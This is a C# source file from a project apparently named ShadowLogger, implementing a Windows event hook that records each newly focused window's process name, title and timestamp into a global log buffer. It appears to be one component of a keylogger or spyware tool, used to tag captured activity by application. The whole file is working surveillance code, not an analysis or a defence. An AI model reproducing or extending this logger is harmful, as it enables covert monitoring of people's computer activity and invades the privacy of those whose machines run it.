using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ShadowLogger.bin.Hooks
{
    internal class WindowChangedHook
    {
        #region " P/Invoke Declarations "

        [DllImport("user32.dll")]
        private static extern IntPtr SetWinEventHook(uint eventMin, uint eventMax, IntPtr hmodWinEventProc, IntPtr lpfnWinEventProc, uint idProcess, uint idThread, uint dwflags);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWinEvent(IntPtr hWinEventHook);

        [DllImport("user32.dll")]
        private static extern int GetWindowThreadProcessId(IntPtr hwnd, ref Int32 lpdwProcessId);

        #endregion

        #region " P/Invoke Variables "

        private const int WINEVENT_OUTOFCONTEXT = 0x0;
        //' Events are ASYNC

        private const int EVENT_SYSTEM_FOREGROUD = 3;

        private const int EVENT_OBJECT_NAMECHANGE = 0x800c;
		//SYSTEM_FOREGROUND is not enough for capturing all the windows that are brought to foreground
		//because it only captures minimizing or closing of a window, if the two are side-by-side or both
		//visible changing between them will not trigger it, thus OBJECT_NAMECHANGE is required since there's
		//no better option for accomplishing what i need, although the performance hit doesn't seem too high.

        #endregion

        private delegate void WinEventProc(IntPtr hWinEventHook, uint Event, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime);

        private readonly WinEventProc _eventProc = new WinEventProc(EventCallBack);
        private IntPtr _hEventForeground;
        private IntPtr _hEventNameChange;

        private static string _lastactive = string.Empty;

        internal void CreateHook()
        {
            _hEventForeground = SetWinEventHook(EVENT_SYSTEM_FOREGROUD, EVENT_SYSTEM_FOREGROUD, IntPtr.Zero, Marshal.GetFunctionPointerForDelegate(_eventProc), 0, 0, WINEVENT_OUTOFCONTEXT);
            _hEventNameChange = SetWinEventHook(EVENT_OBJECT_NAMECHANGE, EVENT_OBJECT_NAMECHANGE, IntPtr.Zero, Marshal.GetFunctionPointerForDelegate(_eventProc), 0, 0, WINEVENT_OUTOFCONTEXT);

            if (_hEventForeground == IntPtr.Zero | _hEventNameChange == IntPtr.Zero)
            {
                GlobalVariables.GlobalVariables.WchHookStatus = false;
            }
            else
            {
                GlobalVariables.GlobalVariables.WchHookStatus = true;
            }
        }

        internal void DisposeHook()
        {
            UnhookWinEvent(_hEventForeground);
            UnhookWinEvent(_hEventNameChange);
            GlobalVariables.GlobalVariables.WchHookStatus = false;
        }

        private static void EventCallBack(IntPtr hWinEventHook, uint Event, IntPtr hwnd, int idObject, int idChild, uint dwEventThread, uint dwmsEventTime)
        {
            if (_lastactive == HostInfo.HostInfo.GetActiveWindowTitle(IntPtr.Zero)) return;

            _lastactive = HostInfo.HostInfo.GetActiveWindowTitle(IntPtr.Zero);
            if (_lastactive == string.Empty)
            {
                return;
            }
            ActiveWindowChanged(HostInfo.HostInfo._GetForegroundWindow(), _lastactive);
        }

        private static void ActiveWindowChanged(IntPtr currentHwnd, string currentTitle)
        {
            int processId = default(int); //why?
            GetWindowThreadProcessId(currentHwnd, ref processId);

            Process proc;
            try
            {
                proc = Process.GetProcessById(processId);
            }
            catch (ArgumentException)
            {
                return;
            }

            GlobalVariables.GlobalVariables.MainData.AppendLine(Environment.NewLine + Environment.NewLine + proc.ProcessName + ".exe " + "- " + currentTitle + "   " + DateTime.Now.ToString("(dd-MM-yyyy" + "  " + "HH:mm:ss)"));
        }
    }
}
